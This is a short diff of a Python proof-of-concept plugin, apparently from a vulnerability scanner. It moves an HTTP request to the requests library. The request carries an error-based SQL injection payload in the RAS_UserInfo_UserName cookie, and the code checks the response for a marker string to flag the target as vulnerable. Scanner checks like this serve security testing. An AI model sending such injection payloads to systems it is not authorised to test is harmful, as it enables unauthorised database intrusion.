@@ -40,8 +40,11 @@ class Poc(ABPoc):
             ]
             for payload in payloads:
                 target = self.target + payload
-                code, head, body, errcode, final_url = hh.http(target, cookie="RAS_UserInfo_UserName=-4758' OR 1 GROUP BY CONCAT(0x71786a6271,(SELECT (CASE WHEN (5786=5786) THEN 1 ELSE 0 END)),0x71707a7171,FLOOR(RAND(0)*2)) HAVING MIN(0)#")
-                if code == 200 and 'qxjbq1qpzqq1' in body:
+                header= {
+                    "Cookie":"RAS_UserInfo_UserName=-4758' OR 1 GROUP BY CONCAT(0x71786a6271,(SELECT (CASE WHEN (5786=5786) THEN 1 ELSE 0 END)),0x71707a7171,FLOOR(RAND(0)*2)) HAVING MIN(0)#"
+                }
+                response = requests.get(target, headers=header)
+                if response.status_code == 200 and 'qxjbq1qpzqq1' in response.text:
                     #security_hole(target)
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
